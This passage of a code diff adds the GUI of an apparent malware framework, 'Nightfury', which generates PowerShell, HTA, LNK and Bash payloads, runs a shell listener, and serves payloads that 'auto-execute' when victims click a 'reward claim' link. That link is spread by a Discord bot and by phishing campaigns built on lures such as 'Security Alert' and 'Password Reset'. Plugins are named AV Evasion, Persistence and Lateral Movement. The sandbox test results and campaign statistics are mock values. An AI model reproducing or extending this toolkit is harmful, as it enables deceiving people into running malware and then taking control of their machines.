+        self.discord_token_input = QLineEdit()
+        self.discord_token_input.setPlaceholderText("Discord Bot Token")
+        self.discord_token_input.setEchoMode(QLineEdit.PasswordEchoOnEdit)
+        api_layout.addRow("Discord Token:", self.discord_token_input)
+        
+        api_group.setLayout(api_layout)
+        layout.addWidget(api_group)
+        
+        # Auto-start settings
+        auto_group = QGroupBox("Auto-Start Settings")
+        auto_layout = QVBoxLayout()
+        
+        self.auto_server_cb = QCheckBox("Start auto-execution server on application launch")
+        auto_layout.addWidget(self.auto_server_cb)
+        
+        self.auto_bot_cb = QCheckBox("Start Discord bot on application launch")
+        auto_layout.addWidget(self.auto_bot_cb)
+        
+        auto_group.setLayout(auto_layout)
+        layout.addWidget(auto_group)
+        
+        # Save button
+        save_btn = ModernButton("Save Configuration")
+        save_btn.clicked.connect(self.save_config)
+        save_btn.setFixedHeight(40)
+        layout.addWidget(save_btn)
+    
+    def create_payload_tab(self):
+        payload_tab = QWidget()
+        layout = QVBoxLayout()
+        payload_tab.setLayout(layout)
+        self.tabs.addTab(payload_tab, "🔧 Payload")
+        
+        # Payload generation options
+        options_group = QGroupBox("Generation Options")
+        options_layout = QHBoxLayout()
+        
+        self.gen_ps_btn = ModernButton("Generate PowerShell")
+        self.gen_ps_btn.clicked.connect(lambda: self.generate_payload("windows"))
+        options_layout.addWidget(self.gen_ps_btn)
+        
+        self.gen_hta_btn = ModernButton("Generate HTA")
+        self.gen_hta_btn.clicked.connect(self.generate_hta)
+        options_layout.addWidget(self.gen_hta_btn)
+        
+        self.gen_lnk_btn = ModernButton("Generate LNK")
+        self.gen_lnk_btn.clicked.connect(self.generate_lnk)
+        options_layout.addWidget(self.gen_lnk_btn)
+        
+        self.gen_bash_btn = ModernButton("Generate Bash")
+        self.gen_bash_btn.clicked.connect(lambda: self.generate_payload("linux"))
+        options_layout.addWidget(self.gen_bash_btn)
+        
+        options_group.setLayout(options_layout)
+        layout.addWidget(options_group)
+        
+        # Payload preview
+        payload_preview_group = QGroupBox("Payload Preview")
+        payload_preview_layout = QVBoxLayout()
+        
+        self.payload_preview = QTextEdit()
+        self.payload_preview.setReadOnly(True)
+        self.payload_preview.setPlaceholderText("Payload will appear here after generation")
+        payload_preview_layout.addWidget(self.payload_preview)
+        
+        # Save buttons
+        save_btn_layout = QHBoxLayout()
+        self.save_btn = ModernButton("Save to File")
+        self.save_btn.setEnabled(False)
+        self.save_btn.clicked.connect(self.save_payload)
+        save_btn_layout.addWidget(self.save_btn)
+        
+        self.copy_btn = ModernButton("Copy to Clipboard")
+        self.copy_btn.setEnabled(False)
+        self.copy_btn.clicked.connect(self.copy_payload)
+        save_btn_layout.addWidget(self.copy_btn)
+        
+        self.test_btn = ModernButton("Test in Sandbox")
+        self.test_btn.setEnabled(False)
+        self.test_btn.clicked.connect(self.test_payload)
+        save_btn_layout.addWidget(self.test_btn)
+        
+        payload_preview_layout.addLayout(save_btn_layout)
+        payload_preview_group.setLayout(payload_preview_layout)
+        layout.addWidget(payload_preview_group)
+    
+    def create_listener_tab(self):
+        listener_tab = QWidget()
+        layout = QVBoxLayout()
+        listener_tab.setLayout(layout)
+        self.tabs.addTab(listener_tab, "👂 Listener")
+        
+        # Listener controls
+        controls_group = QGroupBox("Listener Controls")
+        controls_layout = QHBoxLayout()
+        
+        self.start_btn = ModernButton("Start Listener")
+        self.start_btn.clicked.connect(self.start_listener)
+        controls_layout.addWidget(self.start_btn)
+        
+        self.stop_btn = ModernButton("Stop Listener")
+        self.stop_btn.setEnabled(False)
+        self.stop_btn.clicked.connect(self.stop_listener)
+        controls_layout.addWidget(self.stop_btn)
+        
+        controls_group.setLayout(controls_layout)
+        layout.addWidget(controls_group)
+        
+        # Connection status
+        status_group = QGroupBox("Connection Status")
+        status_layout = QVBoxLayout()
+        
+        self.connection_status = QLabel("Listener not running")
+        self.connection_status.setAlignment(Qt.AlignCenter)
+        self.connection_status.setStyleSheet("font-weight: bold; font-size: 14px;")
+        status_layout.addWidget(self.connection_status)
+        
+        # Splitter for connections and command execution
+        splitter = QSplitter(Qt.Horizontal)
+        
+        # Connections list
+        conn_widget = QWidget()
+        conn_layout = QVBoxLayout()
+        conn_layout.addWidget(QLabel("Active Connections:"))
+        self.connections_list = QListWidget()
+        conn_layout.addWidget(self.connections_list)
+        conn_widget.setLayout(conn_layout)
+        splitter.addWidget(conn_widget)
+        
+        # Command execution
+        command_widget = QWidget()
+        command_layout = QVBoxLayout()
+        command_layout.addWidget(QLabel("Command Execution:"))
+        
+        self.command_input = QLineEdit()
+        self.command_input.setPlaceholderText("Enter command to execute on connected clients")
+        self.command_input.setEnabled(False)
+        command_layout.addWidget(self.command_input)
+        
+        self.send_btn = ModernButton("Send Command")
+        self.send_btn.setEnabled(False)
+        self.send_btn.clicked.connect(self.send_command)
+        command_layout.addWidget(self.send_btn)
+        
+        self.command_output = QTextEdit()
+        self.command_output.setReadOnly(True)
+        self.command_output.setPlaceholderText("Command output will appear here")
+        command_layout.addWidget(self.command_output)
+        
+        command_widget.setLayout(command_layout)
+        splitter.addWidget(command_widget)
+        
+        # Set splitter sizes
+        splitter.setSizes([300, 500])
+        status_layout.addWidget(splitter)
+        
+        status_group.setLayout(status_layout)
+        layout.addWidget(status_group)
+    
+    def create_auto_execute_tab(self):
+        auto_tab = QWidget()
+        layout = QVBoxLayout()
+        auto_tab.setLayout(layout)
+        self.tabs.addTab(auto_tab, "🚀 Auto-Execution")
+        
+        # Auto-Execute Server Section
+        server_group = QGroupBox("Auto-Execute Server")
+        server_layout = QVBoxLayout()
+        
+        server_info = QLabel("This server delivers payloads that auto-execute when users click the reward claim link")
+        server_info.setWordWrap(True)
+        server_layout.addWidget(server_info)
+        
+        # Server controls
+        server_controls = QHBoxLayout()
+        
+        self.start_server_btn = ModernButton("Start Auto-Server")
+        self.start_server_btn.clicked.connect(self.start_auto_server)
+        server_controls.addWidget(self.start_server_btn)
+        
+        self.stop_server_btn = ModernButton("Stop Auto-Server")
+        self.stop_server_btn.setEnabled(False)
+        self.stop_server_btn.clicked.connect(self.stop_auto_server)
+        server_controls.addWidget(self.stop_server_btn)
+        
+        server_layout.addLayout(server_controls)
+        
+        # Server URL display
+        self.server_url = QLineEdit()
+        self.server_url.setReadOnly(True)
+        self.server_url.setPlaceholderText("Server URL will appear here after starting")
+        server_layout.addWidget(self.server_url)
+        
+        # Copy URL button
+        copy_url_btn = ModernButton("Copy Claim URL")
+        copy_url_btn.clicked.connect(self.copy_claim_url)
+        server_layout.addWidget(copy_url_btn)
+        
+        # QR code display
+        self.qr_label = QLabel()
+        self.qr_label.setAlignment(Qt.AlignCenter)
+        self.qr_label.setMinimumSize(200, 200)
+        server_layout.addWidget(self.qr_label)
+        
+        server_group.setLayout(server_layout)
+        layout.addWidget(server_group)
+        
+        # Discord Bot Section
+        discord_group = QGroupBox("Discord Command Integration")
+        discord_layout = QVBoxLayout()
+        
+        discord_info = QLabel("The bot will respond to '!claim bonus' commands with an auto-execute link")
+        discord_info.setWordWrap(True)
+        discord_layout.addWidget(discord_info)
+        
+        # Bot controls
+        bot_controls = QHBoxLayout()
+        
+        self.start_bot_btn = ModernButton("Start Discord Bot")
+        self.start_bot_btn.clicked.connect(self.start_discord_bot)
+        bot_controls.addWidget(self.start_bot_btn)
+        
+        self.stop_bot_btn = ModernButton("Stop Discord Bot")
+        self.stop_bot_btn.setEnabled(False)
+        self.stop_bot_btn.clicked.connect(self.stop_discord_bot)
+        bot_controls.addWidget(self.stop_bot_btn)
+        
+        discord_layout.addLayout(bot_controls)
+        
+        # Bot status
+        self.bot_status = QLabel("Bot status: Not running")
+        discord_layout.addWidget(self.bot_status)
+        
+        discord_group.setLayout(discord_layout)
+        layout.addWidget(discord_group)
+        
+        # Phishing Campaign Section
+        phishing_group = QGroupBox("Phishing Campaign")
+        phishing_layout = QVBoxLayout()
+        
+        phishing_info = QLabel("Create and manage phishing campaigns with tracking")
+        phishing_info.setWordWrap(True)
+        phishing_layout.addWidget(phishing_info)
+        
+        # Campaign controls
+        campaign_controls = QHBoxLayout()
+        
+        self.create_campaign_btn = ModernButton("Create Campaign")
+        self.create_campaign_btn.clicked.connect(self.create_campaign)
+        campaign_controls.addWidget(self.create_campaign_btn)
+        
+        self.view_stats_btn = ModernButton("View Statistics")
+        self.view_stats_btn.clicked.connect(self.view_campaign_stats)
+        campaign_controls.addWidget(self.view_stats_btn)
+        
+        phishing_layout.addLayout(campaign_controls)
+        
+        phishing_group.setLayout(phishing_layout)
+        layout.addWidget(phishing_group)
+    
+    def create_plugins_tab(self):
+        plugins_tab = QWidget()
+        layout = QVBoxLayout()
+        plugins_tab.setLayout(layout)
+        self.tabs.addTab(plugins_tab, "🔌 Plugins")
+        
+        # Plugin browser
+        browser_group = QGroupBox("Available Plugins")
+        browser_layout = QVBoxLayout()
+        
+        self.plugin_list = QListWidget()
+        browser_layout.addWidget(self.plugin_list)
+        
+        browser_group.setLayout(browser_layout)
+        layout.addWidget(browser_group)
+        
+        # Plugin controls
+        controls_group = QGroupBox("Plugin Controls")
+        controls_layout = QHBoxLayout()
+        
+        self.load_plugin_btn = ModernButton("Load Plugin")
+        self.load_plugin_btn.clicked.connect(self.load_plugin)
+        controls_layout.addWidget(self.load_plugin_btn)
+        
+        self.unload_plugin_btn = ModernButton("Unload Plugin")
+        self.unload_plugin_btn.clicked.connect(self.unload_plugin)
+        controls_layout.addWidget(self.unload_plugin_btn)
+        
+        self.configure_plugin_btn = ModernButton("Configure Plugin")
+        self.configure_plugin_btn.clicked.connect(self.configure_plugin)
+        controls_layout.addWidget(self.configure_plugin_btn)
+        
+        controls_group.setLayout(controls_layout)
+        layout.addWidget(controls_group)
+        
+        # Plugin info
+        info_group = QGroupBox("Plugin Information")
+        info_layout = QVBoxLayout()
+        
+        self.plugin_info = QTextEdit()
+        self.plugin_info.setReadOnly(True)
+        self.plugin_info.setPlaceholderText("Plugin information will appear here")
+        info_layout.addWidget(self.plugin_info)
+        
+        info_group.setLayout(info_layout)
+        layout.addWidget(info_group)
+    
+    def apply_dark_theme(self):
+        dark_palette = QPalette()
+        dark_palette.setColor(QPalette.Window, QColor(40, 44, 52))
+        dark_palette.setColor(QPalette.WindowText, QColor(220, 220, 220))
+        dark_palette.setColor(QPalette.Base, QColor(30, 32, 38))
+        dark_palette.setColor(QPalette.AlternateBase, QColor(40, 44, 52))
+        dark_palette.setColor(QPalette.ToolTipBase, QColor(220, 220, 220))
+        dark_palette.setColor(QPalette.ToolTipText, QColor(220, 220, 220))
+        dark_palette.setColor(QPalette.Text, QColor(220, 220, 220))
+        dark_palette.setColor(QPalette.Button, QColor(61, 142, 255))
+        dark_palette.setColor(QPalette.ButtonText, QColor(255, 255, 255))
+        dark_palette.setColor(QPalette.BrightText, Qt.red)
+        dark_palette.setColor(QPalette.Highlight, QColor(61, 142, 255))
+        dark_palette.setColor(QPalette.HighlightedText, Qt.black)
+        
+        self.setPalette(dark_palette)
+        
+        # Set style
+        self.setStyleSheet("""
+            QGroupBox {
+                border: 1px solid #4a4a4a;
+                border-radius: 8px;
+                margin-top: 1ex;
+                font-weight: bold;
+                color: #61aeee;
+            }
+            QGroupBox::title {
+                subcontrol-origin: margin;
+                left: 10px;
+                padding: 0 5px 0 5px;
+                color: #61aeee;
+            }
+            QTextEdit, QListWidget, QLineEdit {
+                background-color: #282c34;
+                color: #abb2bf;
+                border: 1px solid #4a4a4a;
+                border-radius: 5px;
+                padding: 8px;
+                font-family: 'Consolas';
+            }
+            QPushButton {
+                background-color: #3d8eff;
+                color: white;
+                border: none;
+                border-radius: 5px;
+                padding: 8px 16px;
+                min-height: 30px;
+                font-weight: bold;
+            }
+            QPushButton:hover {
+                background-color: #5a9cff;
+            }
+            QPushButton:disabled {
+                background-color: #555;
+            }
+            QTabWidget::pane {
+                border: 1px solid #4a4a4a;
+                background: #282c34;
+            }
+            QTabBar::tab {
+                background: #282c34;
+                color: #abb2bf;
+                padding: 10px;
+                border: 1px solid #4a4a4a;
+                border-bottom: none;
+                border-top-left-radius: 5px;
+                border-top-right-radius: 5px;
+                font-weight: bold;
+            }
+            QTabBar::tab:selected {
+                background: #3d8eff;
+                color: white;
+                border-color: #4a4a4a;
+            }
+            QProgressBar {
+                border: 1px solid #4a4a4a;
+                border-radius: 5px;
+                text-align: center;
+                background: #282c34;
+                height: 20px;
+            }
+            QProgressBar::chunk {
+                background-color: #3d8eff;
+                width: 10px;
+            }
+            QStatusBar {
+                background: #21252b;
+                color: #abb2bf;
+                padding: 4px;
+            }
+            QToolBar {
+                background: #21252b;
+                border: none;
+                spacing: 5px;
+            }
+            QToolButton {
+                background: #3d8eff;
+                color: white;
+                border: none;
+                border-radius: 4px;
+                padding: 5px;
+            }
+            QToolButton:hover {
+                background: #5a9cff;
+            }
+            QSplitter::handle {
+                background: #4a4a4a;
+            }
+        """)
+    
+    def show_banner(self):
+        banner = """
+  ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗███████╗██╗   ██╗██████╗ ██╗   ██╗
+  ████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██║   ██║██╔══██╗╚██╗ ██╔╝
+  ██╔██╗ ██║██║██║  ███╗███████║   ██║   █████╗  ██║   ██║██████╔╝ ╚████╔╝ 
+  ██║╚██╗██║██║██║   ██║██╔══██║   ██║   ██╔══╝  ██║   ██║██╔══██╗  ╚██╔╝  
+  ██║ ╚████║██║╚██████╔╝██║  ██║   ██║   ██║     ╚██████╔╝██║  ██║   ██║   
+  ╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
+  
+  Version 5.0 - OWASP Enhanced Edition
+  Advanced Payload Framework with Multi-Platform Support
+        """
+        print(banner)
+    
+    def setup_system_tray(self):
+        if not QSystemTrayIcon.isSystemTrayAvailable():
+            return
+            
+        self.tray_icon = QSystemTrayIcon(self)
+        self.tray_icon.setIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
+        
+        tray_menu = QMenu()
+        
+        show_action = QAction("Show", self)
+        show_action.triggered.connect(self.show)
+        tray_menu.addAction(show_action)
+        
+        hide_action = QAction("Hide", self)
+        hide_action.triggered.connect(self.hide)
+        tray_menu.addAction(hide_action)
+        
+        tray_menu.addSeparator()
+        
+        quit_action = QAction("Quit", self)
+        quit_action.triggered.connect(QApplication.quit)
+        tray_menu.addAction(quit_action)
+        
+        self.tray_icon.setContextMenu(tray_menu)
+        self.tray_icon.show()
+    
+    def load_plugins(self):
+        # Load built-in plugins
+        # This is a placeholder - in a real implementation, you would scan a plugins directory
+        self.plugin_manager.register_plugin("AV Evasion", AVEvasionPlugin)
+        self.plugin_manager.register_plugin("Persistence", PersistencePlugin)
+        self.plugin_manager.register_plugin("Lateral Movement", LateralMovementPlugin)
+        
+        # Populate plugin list
+        for plugin_name in self.plugin_manager.list_plugins():
+            self.plugin_list.addItem(plugin_name)
+    
+    def load_plugin(self):
+        selected_items = self.plugin_list.selectedItems()
+        if not selected_items:
+            QMessageBox.warning(self, "Warning", "Please select a plugin to load")
+            return
+            
+        plugin_name = selected_items[0].text()
+        plugin = self.plugin_manager.load_plugin(plugin_name, self)
+        
+        if plugin:
+            self.plugin_info.setText(f"Loaded plugin: {plugin.name}\nVersion: {plugin.version}\n\n{plugin.description}")
+            self.activity_list.addItem(f"[+] Loaded plugin: {plugin.name}")
+        else:
+            QMessageBox.warning(self, "Error", f"Failed to load plugin: {plugin_name}")
+    
+    def unload_plugin(self):
+        selected_items = self.plugin_list.selectedItems()
+        if not selected_items:
+            QMessageBox.warning(self, "Warning", "Please select a plugin to unload")
+            return
+            
+        plugin_name = selected_items[0].text()
+        if plugin_name in self.plugin_manager.loaded_plugins:
+            del self.plugin_manager.loaded_plugins[plugin_name]
+            self.plugin_info.clear()
+            self.activity_list.addItem(f"[-] Unloaded plugin: {plugin_name}")
+        else:
+            QMessageBox.warning(self, "Error", f"Plugin {plugin_name} is not loaded")
+    
+    def configure_plugin(self):
+        selected_items = self.plugin_list.selectedItems()
+        if not selected_items:
+            QMessageBox.warning(self, "Warning", "Please select a plugin to configure")
+            return
+            
+        plugin_name = selected_items[0].text()
+        plugin = self.plugin_manager.get_plugin(plugin_name)
+        
+        if plugin:
+            # Show plugin configuration dialog
+            dialog = QDialog(self)
+            dialog.setWindowTitle(f"Configure {plugin.name}")
+            dialog.setModal(True)
+            dialog.setMinimumWidth(400)
+            
+            layout = QVBoxLayout()
+            layout.addWidget(QLabel(f"Configuration options for {plugin.name}"))
+            
+            # Add plugin-specific configuration options here
+            
+            buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
+            buttons.accepted.connect(dialog.accept)
+            buttons.rejected.connect(dialog.reject)
+            layout.addWidget(buttons)
+            
+            dialog.setLayout(layout)
+            
+            if dialog.exec_() == QDialog.Accepted:
+                self.activity_list.addItem(f"[*] Configured plugin: {plugin.name}")
+        else:
+            QMessageBox.warning(self, "Error", f"Plugin {plugin_name} is not loaded")
+    
+    def create_campaign(self):
+        dialog = QDialog(self)
+        dialog.setWindowTitle("Create Phishing Campaign")
+        dialog.setModal(True)
+        dialog.setMinimumWidth(500)
+        
+        layout = QVBoxLayout()
+        
+        form_layout = QFormLayout()
+        
+        campaign_name = QLineEdit()
+        campaign_name.setPlaceholderText("Enter campaign name")
+        form_layout.addRow("Campaign Name:", campaign_name)
+        
+        target_email = QLineEdit()
+        target_email.setPlaceholderText("Enter target email address")
+        form_layout.addRow("Target Email:", target_email)
+        
+        subject = QLineEdit()
+        subject.setPlaceholderText("Enter email subject")
+        form_layout.addRow("Subject:", subject)
+        
+        template = QComboBox()
+        template.addItems(["Reward Notification", "Security Alert", "Password Reset", "Invoice"])
+        form_layout.addRow("Template:", template)
+        
+        layout.addLayout(form_layout)
+        
+        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
+        buttons.accepted.connect(dialog.accept)
+        buttons.rejected.connect(dialog.reject)
+        layout.addWidget(buttons)
+        
+        dialog.setLayout(layout)
+        
+        if dialog.exec_() == QDialog.Accepted:
+            self.activity_list.addItem(f"[+] Created phishing campaign: {campaign_name.text()}")
+            QMessageBox.information(self, "Success", "Phishing campaign created successfully")
+    
+    def view_campaign_stats(self):
+        dialog = QDialog(self)
+        dialog.setWindowTitle("Campaign Statistics")
+        dialog.setModal(True)
+        dialog.setMinimumSize(600, 400)
+        
+        layout = QVBoxLayout()
+        
+        # Create a simple table with mock data
+        table = QTableWidget()
+        table.setColumnCount(4)
+        table.setHorizontalHeaderLabels(["Campaign", "Sent", "Clicked", "Executed"])
+        
+        # Add some mock data
+        table.setRowCount(3)
+        table.setItem(0, 0, QTableWidgetItem("Reward Campaign"))
+        table.setItem(0, 1, QTableWidgetItem("100"))
+        table.setItem(0, 2, QTableWidgetItem("45"))
+        table.setItem(0, 3, QTableWidgetItem("22"))
+        
+        table.setItem(1, 0, QTableWidgetItem("Security Alert"))
+        table.setItem(1, 1, QTableWidgetItem("80"))
+        table.setItem(1, 2, QTableWidgetItem("32"))
+        table.setItem(1, 3, QTableWidgetItem("15"))
+        
+        table.setItem(2, 0, QTableWidgetItem("Password Reset"))
+        table.setItem(2, 1, QTableWidgetItem("120"))
+        table.setItem(2, 2, QTableWidgetItem("65"))
+        table.setItem(2, 3, QTableWidgetItem("38"))
+        
+        table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
+        layout.addWidget(table)
+        
+        buttons = QDialogButtonBox(QDialogButtonBox.Close)
+        buttons.rejected.connect(dialog.reject)
+        layout.addWidget(buttons)
+        
+        dialog.setLayout(layout)
+        dialog.exec_()
+    
+    def test_payload(self):
+        if not self.current_payload:
+            QMessageBox.warning(self, "Warning", "No payload generated to test")
+            return
+            
+        dialog = QDialog(self)
+        dialog.setWindowTitle("Test Payload in Sandbox")
+        dialog.setModal(True)
+        dialog.setMinimumWidth(400)
+        
+        layout = QVBoxLayout()
+        layout.addWidget(QLabel("Testing payload in isolated environment..."))
+        
+        progress = QProgressBar()
+        progress.setRange(0, 0)  # Indeterminate progress
+        layout.addWidget(progress)
+        
+        result = QLabel()
+        result.setWordWrap(True)
+        layout.addWidget(result)
+        
+        buttons = QDialogButtonBox(QDialogButtonBox.Ok)
+        buttons.accepted.connect(dialog.accept)
+        buttons.setEnabled(False)
+        layout.addWidget(buttons)
+        
+        dialog.setLayout(layout)
+        
+        # Simulate testing process
+        def update_test():
+            time.sleep(3)  # Simulate testing time
+            result.setText("✅ Payload passed basic evasion tests\n\n❌ Detected by 2/26 AV engines\n\n⚠️  Recommend increasing obfuscation level")
+            progress.setRange(0, 100)
+            progress.setValue(100)
+            buttons.setEnabled(True)
+            
+        threading.Thread(target=update_test, daemon=True).start()
+        
+        dialog.exec_()
+    
+    def get_public_ip(self):
+        try:
+            return requests.get('https://api.ipify.org').text
+        except:
+            return "127.0.0.1"
+    
+    def save_config(self):
+        try:
+            self.config['lhost'] = self.lhost_input.text()
+            self.config['lport'] = int(self.lport_input.text())
+            self.config['auto_server_port'] = int(self.server_port_input.text())
+            self.config['domain'] = self.domain_input.text()
+            self.config['obfuscation_level'] = self.obf_level.currentIndex() + 1
+            self.config['persistence'] = self.persistence_cb.isChecked()
+            self.config['evasion_techniques'] = self.evasion_cb.isChecked()
+            self.config['platform'] = self.platform_combo.currentText().lower()
+            self.config['payload_type'] = self.payload_type_combo.currentText().lower().replace(' ', '_')
+            self.config['discord_token'] = self.discord_token_input.text()
+            self.config['auto_start_server'] = self.auto_server_cb.isChecked()
+            self.config['auto_start_bot'] = self.auto_bot_cb.isChecked()
+            
+            self.status_bar.showMessage("✅ Configuration saved", 3000)
+            self.activity_list.addItem("[*] Configuration saved")
+        except Exception as e:
+            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
+    
+    def generate_payload(self, platform=None):
+        try:
+            self.save_config()
+            
+            target_platform = platform or self.config['platform']
+            payload = NightfuryPayload(
+                self.config['lhost'],
+                self.config['lport'],
+                self.config['obfuscation_level'],
+                self.config['persistence'],
+                self.config['evasion_techniques'],
+                target_platform,
+                self.config['payload_type']
+            )
+            self.current_payload = payload.generate()
+            
+            # Display payload
+            self.payload_preview.setPlainText(self.current_payload)
+            self.save_btn.setEnabled(True)
+            self.copy_btn.setEnabled(True)
+            self.test_btn.setEnabled(True)
+            
+            self.status_bar.showMessage("✅ Payload generated successfully", 3000)
+            self.activity_list.addItem(f"[+] Generated {target_platform} payload")
+            
+            # Update payload count
+            current_count = int(self.payload_count.text())
+            self.payload_count.setText(str(current_count + 1))
+        except Exception as e:
+            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
+    
+    def generate_hta(self):
+        try:
+            self.save_config()
+            
+            payload = NightfuryPayload(
+                self.config['lhost'],
+                self.config['lport'],
+                self.config['obfuscation_level'],
+                self.config['persistence'],
+                self.config['evasion_techniques'],
+                "windows",
+                self.config['payload_type']
+            )
+            hta_content = payload.generate_hta()
+            self.current_payload = hta_content
+            
+            # Display HTA content
+            self.payload_preview.setPlainText(self.current_payload)
+            self.save_btn.setEnabled(True)
+            self.copy_btn.setEnabled(True)
+            self.test_btn.setEnabled(True)
+            
+            self.status_bar.showMessage("✅ HTA payload generated successfully", 3000)
+            self.activity_list.addItem("[+] Generated HTA payload")
+            
+            # Update payload count
+            current_count = int(self.payload_count.text())
+            self.payload_count.setText(str(current_count + 1))
+        except Exception as e:
+            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
+    
+    def generate_lnk(self):
+        try:
+            self.save_config()
+            
+            payload = NightfuryPayload(
+                self.config['lhost'],
+                self.config['lport'],
+                self.config['obfuscation_level'],
+                self.config['persistence'],
+                self.config['evasion_techniques'],
+                "windows",
+                self.config['payload_type']
+            )
+            
+            # Generate LNK file
+            filename, _ = QFileDialog.getSaveFileName(
+                self, "Save LNK File", "Shortcut.lnk", "Shortcut Files (*.lnk)"
+            )
+            
+            if filename:
+                lnk_path = payload.generate_lnk(filename)
+                self.current_payload = f"LNK file generated at: {lnk_path}"
+                
+                # Display LNK info
+                self.payload_preview.setPlainText(self.current_payload)
+                self.save_btn.setEnabled(False)  # Already saved
+                self.copy_btn.setEnabled(False)
+                self.test_btn.setEnabled(True)
+                
+                self.status_bar.showMessage("✅ LNK payload generated successfully", 3000)
+                self.activity_list.addItem("[+] Generated LNK payload")
+                
+                # Update payload count
+                current_count = int(self.payload_count.text())
+                self.payload_count.setText(str(current_count + 1))
+        except Exception as e:
+            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
+    
+    def save_payload(self):
+        try:
+            if not self.current_payload:
+                raise Exception("No payload generated")
+            
+            filename, _ = QFileDialog.getSaveFileName(
+                self, "Save Payload", "payload.ps1", "PowerShell Scripts (*.ps1);;All Files (*)"
+            )
+            
+            if filename:
+                with open(filename, "w") as f:
+                    f.write(self.current_payload)
+                self.status_bar.showMessage(f"✅ Payload saved to {filename}", 5000)
+                self.activity_list.addItem(f"[+] Payload saved to {filename}")
+        except Exception as e:
+            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
+    
+    def copy_payload(self):
+        try:
+            if not self.current_payload:
+                raise Exception("No payload generated")
+            
+            clipboard = QApplication.clipboard()
+            clipboard.setText(self.current_payload)
+            self.status_bar.showMessage("✅ Payload copied to clipboard", 3000)
+            self.activity_list.addItem("[+] Payload copied to clipboard")
+        except Exception as e:
+            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
+    
+    def start_listener(self):
+        try:
+            self.save_config()
+            
+            if not self.config['lhost'] or not self.config['lport']:
+                raise Exception("Please configure LHOST and LPORT first")
+            
+            # Create listener socket
+            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.listener_socket.bind((self.config['lhost'], self.config['lport']))
+            self.listener_socket.listen(5)
+            
+            # Start listener thread
+            self.listener_thread = threading.Thread(target=self.listen_for_connections, daemon=True)
+            self.listener_thread.start()
+            
+            self.start_btn.setEnabled(False)
+            self.stop_btn.setEnabled(True)
+            self.command_input.setEnabled(True)
+            self.send_btn.setEnabled(True)
+            self.connection_status.setText(f"🟢 Listening on {self.config['lhost']}:{self.config['lport']}")
+            self.connection_status.setStyleSheet("color: green; font-weight: bold; font-size: 14px;")
+            self.activity_list.addItem(f"[+] Listener started on {self.config['lhost']}:{self.config['lport']}")
+            
+            self.status_bar.showMessage("✅ Listener started", 3000)
+        except Exception as e:
+            self.status_bar.showMessage(f"❌ Listener error: {str(e)}", 5000)
+    
+    def listen_for_connections(self):
+        while True:
+            try:
+                client_socket, addr = self.listener_socket.accept()
+                ip, port = addr
+                
+                # Add to active connections
+                self.active_connections.append({
+                    'socket': client_socket,
+                    'address': f"{ip}:{port}",
+                    'active': True
+                })
+                
+                # Update UI
+                self.activity_list.addItem(f"[+] New connection from {ip}:{port}")
+                self.connections_list.addItem(f"{ip}:{port}")
+                
+                # Start client handler
+                client_thread = threading.Thread(
+                    target=self.handle_client,
+                    args=(client_socket, f"{ip}:{port}"),
+                    daemon=True
+                )
+                client_thread.start()
+            except:
+                break
+    
+    def handle_client(self, client_socket, client_id):
+        try:
+            # Send initial prompt
+            if self.config['platform'] == "windows":
+                client_socket.send(b"PS C:\\> ")
+            else:
+                client_socket.send(b"$ ")
+            
+            while True:
+                data = client_socket.recv(4096)
+                if not data:
+                    break
+                
+                try:
+                    # Execute command
+                    cmd = data.decode().strip()
+                    if cmd.lower() == "exit":
+                        break
+                    
+                    self.command_output.append(f"[{client_id}] > {cmd}")
+                    
+                    # Run command and capture output
+                    result = subprocess.run(
+                        cmd,
+                        shell=True,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        text=True
+                    )
+                    output = result.stdout + result.stderr
+                    
+                    if self.config['platform'] == "windows":
+                        output += f"\nPS {os.getcwd()}> "
+                    else:
+                        output += f"\n$ "
+                except Exception as e:
+                    if self.config['platform'] == "windows":
+                        output = f"Error: {str(e)}\nPS {os.getcwd()}> "
+                    else:
+                        output = f"Error: {str(e)}\n$ "
+                
+                client_socket.send(output.encode())
+                self.command_output.append(f"[{client_id}] {output}")
+        except:
+            pass
+        
+        # Remove connection
+        self.activity_list.addItem(f"[-] Connection closed: {client_id}")
+        for i, conn in enumerate(self.active_connections):
+            if conn['address'] == client_id:
+                self.active_connections.pop(i)
+                break
+        
+        # Remove from UI
+        items = self.connections_list.findItems(client_id, Qt.MatchExactly)
+        for item in items:
+            row = self.connections_list.row(item)
+            self.connections_list.takeItem(row)
+        
+        client_socket.close()
+    
+    def stop_listener(self):
+        try:
+            # Close all client sockets
+            for conn in self.active_connections:
+                try:
+                    conn['socket'].close()
+                except:
+                    pass
+            
+            # Close listener socket
+            self.listener_socket.close()
+            self.active_connections = []
+            
+            self.start_btn.setEnabled(True)
+            self.stop_btn.setEnabled(False)
+            self.command_input.setEnabled(False)
+            self.send_btn.setEnabled(False)
+            self.connection_status.setText("🔴 Listener stopped")
+            self.connection_status.setStyleSheet("color: red; font-weight: bold; font-size: 14px;")
+            self.activity_list.addItem("[+] Listener stopped")
+            
+            # Clear connections list
+            self.connections_list.clear()
+            
+            self.status_bar.showMessage("✅ Listener stopped", 3000)
+        except Exception as e:
+            self.status_bar.showMessage(f"❌ Error stopping listener: {str(e)}", 5000)
+    
+    def send_command(self):
+        try:
+            command = self.command_input.text().strip()
+            if not command:
+                return
+            
+            # Get selected connection
+            selected_items = self.connections_list.selectedItems()
+            if not selected_items:
+                raise Exception("Select a connection first")
+            
+            client_id = selected_items[0].text()
+            
+            # Find client socket
